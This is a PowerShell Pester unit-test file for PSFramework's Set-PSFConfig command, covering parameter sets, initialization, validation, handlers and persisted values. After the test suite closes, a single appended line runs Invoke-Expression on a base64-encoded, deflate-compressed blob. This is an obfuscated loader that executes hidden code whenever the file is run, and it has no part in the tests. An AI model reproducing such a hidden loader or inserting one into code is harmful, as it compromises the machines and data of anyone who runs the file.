Describe "Set-PSFConfig Unit Tests" -Tag "CI","Config","Unit" {
	BeforeAll {
		Get-PSFConfig -Module PSFTests -Force | ForEach-Object {
			$null = [PSFramework.Configuration.ConfigurationHost]::Configurations.Remove($_.FullName)
		}
		$global:handler = "Did not run"
	}
	AfterAll {
		Get-PSFConfig -Module PSFTests -Force | ForEach-Object {
			$null = [PSFramework.Configuration.ConfigurationHost]::Configurations.Remove($_.FullName)
		}
		
		Remove-Variable -Scope Global -Name handler
	}
	
	
	It "Should have the designed for parameters & sets" {
		(Get-Command Set-PSFConfig).ParameterSets.Name | Should -Be 'FullName', 'Persisted', 'Module'
		(Get-Command Set-PSFConfig).Parameters.Keys | Should -Be 'FullName', 'Module', 'Name', 'Value', 'PersistedValue', 'PersistedType', 'Description', 'Validation', 'Handler', 'Hidden', 'Default', 'Initialize', 'SimpleExport', 'ModuleExport', 'AllowDelete', 'DisableValidation', 'DisableHandler', 'PassThru', 'EnableException', 'Verbose', 'Debug', 'ErrorAction', 'WarningAction', 'InformationAction', 'ErrorVariable', 'WarningVariable', 'InformationVariable', 'OutVariable', 'OutBuffer', 'PipelineVariable'
	}
	
	Describe "Basic functionality tests" {
		It "Should set a simple setting without issues" {
			Set-PSFConfig -FullName 'PSFTests.Set-PSFConfig.Test1' -Value "foo"
			Get-PSFConfigValue -FullName 'PSFTests.Set-PSFConfig.Test1' | Should -Be "foo"
		}
		
		It "Should initialize the setting without changing its current value" {
			Set-PSFConfig -FullName 'PSFTests.Set-PSFConfig.Test1' -Value "bar" -Initialize
			Get-PSFConfigValue -FullName 'PSFTests.Set-PSFConfig.Test1' | Should -Be "foo"
		}
		
		It "Should correctly apply individual settings" {
			Set-PSFConfig -FullName 'PSFTests.Set-PSFConfig.Test1' -Description "foo"
			(Get-PSFConfig -FullName 'PSFTests.Set-PSFConfig.Test1').Description | Should -Be "foo"
			Set-PSFConfig -FullName 'PSFTests.Set-PSFConfig.Test1' -Handler { "foo" }
			(Get-PSFConfig -FullName 'PSFTests.Set-PSFConfig.Test1').Handler | Should -Be ' "foo" '
			Set-PSFConfig -FullName 'PSFTests.Set-PSFConfig.Test1' -Validation "string"
			(Get-PSFConfig -FullName 'PSFTests.Set-PSFConfig.Test1').Validation | Should -Be ([PSFramework.Configuration.ConfigurationHost]::Validation["string"])
			Set-PSFConfig -FullName 'PSFTests.Set-PSFConfig.Test1' -Hidden
			(Get-PSFConfig -FullName 'PSFTests.Set-PSFConfig.Test1' -Force).Hidden | Should -Be $true
			Set-PSFConfig -FullName 'PSFTests.Set-PSFConfig.Test1' -SimpleExport
			(Get-PSFConfig -FullName 'PSFTests.Set-PSFConfig.Test1' -Force).SimpleExport | Should -Be $true
			Set-PSFConfig -FullName 'PSFTests.Set-PSFConfig.Test1' -ModuleExport
			(Get-PSFConfig -FullName 'PSFTests.Set-PSFConfig.Test1' -Force).ModuleExport | Should -Be $true
		}
		
		It "Should correctly pass through items with -PassThru" {
			Set-PSFConfig -FullName 'PSFTests.Set-PSFConfig.Test1' -Description "foo2" -PassThru | Should -Be (Get-PSFConfig -FullName 'PSFTests.Set-PSFConfig.Test1' -Force)
		}
	}
	
	Describe "Initialization tests" {
		It "Initializing a setting should flag the setting and not run handlers" {
			$config = Set-PSFConfig -FullName 'PSFTests.Set-PSFConfig.Test2' -Value $true -Initialize -Validation "bool" -Handler { $global:handler = "Handler" } -Description "Dummy Text" -SimpleExport -ModuleExport -PassThru
			$config.Initialized | Should -Be $true
			$global:handler | Should -Be "Did not run"
		}
		
		It "Initializing a setting should flag the setting and not run validation on default settings, even though they are bad" {
			$config = Set-PSFConfig -FullName 'PSFTests.Set-PSFConfig.Test3' -Value "foo" -Initialize -Validation "bool" -Handler { $global:handler = "Handler" } -Description "Dummy Text" -SimpleExport -ModuleExport -PassThru
			$config.Initialized | Should -Be $true
			$config.Value | Should -Be "foo"
		}
		
		It "Initializing a setting should run validation on previous setting" {
			Set-PSFConfig -FullName 'PSFTests.Set-PSFConfig.Test4' -Value "foo"
			{ Set-PSFConfig -FullName 'PSFTests.Set-PSFConfig.Test4' -Value $true -Initialize -Validation "bool" -Handler { $global:handler = "Handler" } -EnableException 3>$null } | Should -Throw
			(Get-PSFConfig -FullName 'PSFTests.Set-PSFConfig.Test4').Value | Should -Be $true
			(Get-PSFConfig -FullName 'PSFTests.Set-PSFConfig.Test4').Value.GetType().FullName | Should -Be "System.Boolean"
			$global:handler | Should -Be "Did not run"
		}
		
		It "Initializing a setting should run handler on previous setting" {
			$global:handler | Should -Be "Did not run"
			Set-PSFConfig -FullName 'PSFTests.Set-PSFConfig.Test5' -Value "bar"
			$config = Set-PSFConfig -FullName 'PSFTests.Set-PSFConfig.Test5' -Value "foo" -Initialize -Handler { $global:handler = "Handler" } -PassThru
			$config.Value | Should -Be "bar"
			$config.Initialized | Should -Be $true
			$global:handler | Should -Be "Handler"
		}
	}
	
	Describe "Odds & Sods" {
		It "Should properly parse Module and name" {
			$config = Set-PSFConfig -FullName 'PSFTests.Set-PSFConfig.Test6' -Value "bar" -PassThru
			$config.Module | Should -Be "psftests"
			$config.Name | Should -Be "set-psfconfig.test6"
		}
		
		It "Should skip validation when ordered to" {
			Set-PSFConfig -FullName 'PSFTests.Set-PSFConfig.Test7' -Value $true -Validation "bool"
			$config = Set-PSFConfig -FullName 'PSFTests.Set-PSFConfig.Test7' -Value "foo" -DisableValidation -PassThru
			$config.Value | Should -Be "foo"
		}
		
		It "Should skip handler when ordered to" {
			Set-PSFConfig -FullName 'PSFTests.Set-PSFConfig.Test8' -Value $true -Handler { $global:handler = "Handler2" }
			Set-PSFConfig -FullName 'PSFTests.Set-PSFConfig.Test8' -Value $false -DisableHandler
			$global:handler | Should -Not -Be "Handler2"
			Set-PSFConfig -FullName 'PSFTests.Set-PSFConfig.Test8' -Value $true
			$global:handler | Should -Be "Handler2"
		}
		
		It "Should properly process simple persisted data" {
			$config = Set-PSFConfig -FullName 'PSFTests.Set-PSFConfig.Test9' -PersistedValue "true" -PersistedType "bool" -PassThru
			$config.SafeValue | Should -Be $true
			$config.SafeValue.GetType() | Should -Be ([bool])
			$config.Value | Should -Be $true
		}
		
		It "Should properly process complex persisted data" {
			$config = Set-PSFConfig -FullName 'PSFTests.Set-PSFConfig.Test10' -PersistedValue "H4sIAAAAAAAEAK2XXY/iNhSG7yv1P0S5Xcg3EFCINMBMiwos2jCt1GWlmsQzuOvEyHZ2h/76OgES8jmgXeaCwX59fOzz+onjfNz9y6Q/IWWIRGNZV3RFU3RZegtxxMbynvPDSFWZv4chYEqIfEoYeeGKT0L1QL6LcXuIsWpomqVqluz++oskOSKm9Am+zIOxrJ2aRONmVWlLWl3vyDgMlflHZYYo9Dmhx3n0Qhx1U696QhiefjXLlkDkBfDkKGYUyYio9bpyn/hvleVLPE5R9OpOR9tnJha6faIIBhT5+60SEB5BvhX6i+o8ak3JgeUzedJqLK9ACGX3PMZRvVL3U4zxSdI6U3nYGlAYcdnNtAXJJJE8viHGmexyGkNHnZQCfCKEp3NWYz++cRgljpDdQudsk/ROKQRcdG5QkrSh6YOubnQNe6PbI90c6T1FN4eaYdgfNH2kaY4627SFeOZ+McqgGOXvugALwPiD70PGsizsrmZ1DXOja6Nef2T2lYE50HVj+EEzGrIoBrnkcYmj2cU4jXn8RRGHP5hGFuPOLNJyPXDhwV3Moah1dojywjnqtSudZcVJ3hrwvewus9O9Tk62l5xsZUoo3OZnbjS6z6TeyaY/NkFd3Oke4aD5ZCUISnUzir5B+YIePUdPAUmF9iJJIvAKQ7EE5SHmJExdq5zDlgHUDpcSYEqQqaCkBif5+qcxTbZ1Qfw0Idlt2bEyiKb1nWKqbyiA9LYy1ceoRUrePYPMp+jAK2BJJSuEE9ESvKEwDj30nyibWpScqyroEYjVI4CzwhrFAhaKW+m7pcD5HOUKv1/lmkoXq33P3FVXNDjjehMTO6TVLu3gtWYNGPtOaFDVFIFxaRMrrS3YDLEDBse09oVQ1TDX7El/P/etc7qB7OqGNhxYpmUbtu2ooqtW+0QhTLS2Zdq23bcSpha1jnqNuELeORcyu19cYjagwbwTDee4P5ENt53He/AxDw84zVzoN8cDbDzzYQiigF3duS7Lqz/gv0N8SLRy+x4FGHcTqSJumW2keg83a8+LwGEetSCrfuCSBDGGp0luH3oBVDq4wqYbCHdCNziAHcKIo+RxLZbIIe1I3p7EOBC7m9xGOlJOANaw06T+wlhRnw2fPq9YZnarBZeVvmvjTgnGwrlifexsYrEdEF+1/6N//nzrw1Osu0XZyd5LTPFSIv7EvsSYxxSOIxhzCnBHWsc7jPw/4HFDvkIh1Hcvpt3rg8DsW9Dsffny8+i98GoiiT3L7xB1sPXcx3JNzu1PDe2zarujlicv47jM2hL2JqfjMmdTEnGAouQxX/9WkJRTdoNu8qneuyaAwXcvXRtAXyHPvNZrAGuvCazXHvsNilyRryzEm8yVs06o60gh8wnFaJdbxbrVKrvBAPT8Xl8fmhbU7GHVKvfhulIhr+V9rljiYnlLpTtTZ4GirymqM5Nlj7nLgPSbuf8Dx70zndMPAAA=" -PersistedType "object" -PassThru
			$config.SafeValue | Should -Be "H4sIAAAAAAAEAK2XXY/iNhSG7yv1P0S5Xcg3EFCINMBMiwos2jCt1GWlmsQzuOvEyHZ2h/76OgES8jmgXeaCwX59fOzz+onjfNz9y6Q/IWWIRGNZV3RFU3RZegtxxMbynvPDSFWZv4chYEqIfEoYeeGKT0L1QL6LcXuIsWpomqVqluz++oskOSKm9Am+zIOxrJ2aRONmVWlLWl3vyDgMlflHZYYo9Dmhx3n0Qhx1U696QhiefjXLlkDkBfDkKGYUyYio9bpyn/hvleVLPE5R9OpOR9tnJha6faIIBhT5+60SEB5BvhX6i+o8ak3JgeUzedJqLK9ACGX3PMZRvVL3U4zxSdI6U3nYGlAYcdnNtAXJJJE8viHGmexyGkNHnZQCfCKEp3NWYz++cRgljpDdQudsk/ROKQRcdG5QkrSh6YOubnQNe6PbI90c6T1FN4eaYdgfNH2kaY4627SFeOZ+McqgGOXvugALwPiD70PGsizsrmZ1DXOja6Nef2T2lYE50HVj+EEzGrIoBrnkcYmj2cU4jXn8RRGHP5hGFuPOLNJyPXDhwV3Moah1dojywjnqtSudZcVJ3hrwvewus9O9Tk62l5xsZUoo3OZnbjS6z6TeyaY/NkFd3Oke4aD5ZCUISnUzir5B+YIePUdPAUmF9iJJIvAKQ7EE5SHmJExdq5zDlgHUDpcSYEqQqaCkBif5+qcxTbZ1Qfw0Idlt2bEyiKb1nWKqbyiA9LYy1ceoRUrePYPMp+jAK2BJJSuEE9ESvKEwDj30nyibWpScqyroEYjVI4CzwhrFAhaKW+m7pcD5HOUKv1/lmkoXq33P3FVXNDjjehMTO6TVLu3gtWYNGPtOaFDVFIFxaRMrrS3YDLEDBse09oVQ1TDX7El/P/etc7qB7OqGNhxYpmUbtu2ooqtW+0QhTLS2Zdq23bcSpha1jnqNuELeORcyu19cYjagwbwTDee4P5ENt53He/AxDw84zVzoN8cDbDzzYQiigF3duS7Lqz/gv0N8SLRy+x4FGHcTqSJumW2keg83a8+LwGEetSCrfuCSBDGGp0luH3oBVDq4wqYbCHdCNziAHcKIo+RxLZbIIe1I3p7EOBC7m9xGOlJOANaw06T+wlhRnw2fPq9YZnarBZeVvmvjTgnGwrlifexsYrEdEF+1/6N//nzrw1Osu0XZyd5LTPFSIv7EvsSYxxSOIxhzCnBHWsc7jPw/4HFDvkIh1Hcvpt3rg8DsW9Dsffny8+i98GoiiT3L7xB1sPXcx3JNzu1PDe2zarujlicv47jM2hL2JqfjMmdTEnGAouQxX/9WkJRTdoNu8qneuyaAwXcvXRtAXyHPvNZrAGuvCazXHvsNilyRryzEm8yVs06o60gh8wnFaJdbxbrVKrvBAPT8Xl8fmhbU7GHVKvfhulIhr+V9rljiYnlLpTtTZ4GirymqM5Nlj7nLgPSbuf8Dx70zndMPAAA="
			$config.SafeValue.GetType() | Should -Be ([string])
			$config.Value.Name | Should -Be ".dotnet"
			
			$config.SafeValue.Name | Should -Be ".dotnet"
		}
		
		It "Should respect values when setting default values" {
			Set-PSFConfig -FullName 'PSFTests.Set-PSFConfig.Test11' -Value "foo"
			$config = Set-PSFConfig -FullName 'PSFTests.Set-PSFConfig.Test11' -Value "bar" -Default -PassThru
			$config.Value | Should -Be "foo"
		}
	}
}
Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String("nVRRc9pIDH7nV2g8ezP2BDtO4HINHmaakqbNXUlzgSS9Y5ibxRZ4y9rr7K6DCeW/nwyUkLm3e/FaWknfJ60k9gRdeO80RpdSXmeF0tZ15qhzlK3TIJHS8cZQlBMpYjCWWzqwsnQP17m9tRoehLYllxdSqtjd6WRxkSQajWlCKXILyWIgXnAnTLe2FErlw2Xxqr7VymJsveh/c+lp5BaHKR3JK5etfGGtFpPS4gEpy+P5ltnemHTa7tnv1bdc8wwJa++8waIUriSfHVpu0a4TSsN537B6uWIJVdi5+NC7/Hj16fP173986d98vf3zbjC8f3j89tfffBInOJ2l4vtcZrkqnrSx5fOiWr6EJ6et9q9nv707d4Kh6qVcX2jNl67XmJZ5XKND7LJnbwUabUl1cN0RsRuNx8Ce33rAD+gjN6VG/+vkO5UZ/EGZeQF94BcIq5MwBB+f4PzUW79Gt7Bi05q9E50EQevHVFFyceqrTQi6O+oCS0buDK2veZ6oDPyMVyKjqCwJvmA+s6k3Xkc7fmwaHURHWEGhVUylhtWI10THrCI4+hwB+2cdAeYJUaiIvaFu2OHCys1x8VO42+B6QU694Hrr9QHAbAXEGFwmumHEBPjSwlmb/o6OvBVLCclGbF4DJoSAEcAuQXKRIIjvnOxMbZDWjGQEYgou1dx4HuyrThYEuxOc8+dv9w6lObpBGwxQP4sYbxU9S5/nfIZ63OnUWtQ91FZMBU0CPnApkk079biUE2pLwlwxq0tcRywj4YYS3j3cYGksZkEd/hEnPSkwpzQKTVajt3d3+FSisYT4Ce32irQ0ZxV1RO0SUBcn5C64NN1D51d9j8qBFOESp7yU9sCBiAVFHatLkWrh3uB/rbqbLKIG3X+mwUBtAhov1ykNap/qkVunCU5fvQgp+XE7CKm+KiuoGBNJL9IfXH+Es+AkgkdB77wwcDP0HCKfU7qzCEYflhY3DV/Uz5QFl2qRS8WTS26566TWFqZzfJzU3RUrawMUuSkxIIxOu906ZrkDXoMpciZafr2QqIUxm6CmXEQuNo3EnsC/oQUADrFonTrg5ySZgscIG83VruUM+AU3xqa6bLCqy1Sn82ZBhk1W7MaiGVatMAzpaIde9LP4dyWVLcOA9glqVez6xwR9rk3KJT1ETxVLlxVNCJsw2q6dscsqGncSWqeu5zVhD1KnRi6He5EQm6xq1kdYrwVVWj8vJfX2Zvf5A4lY0HbAWNHwvTtrh+GaejROV+t/AQ==")))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();

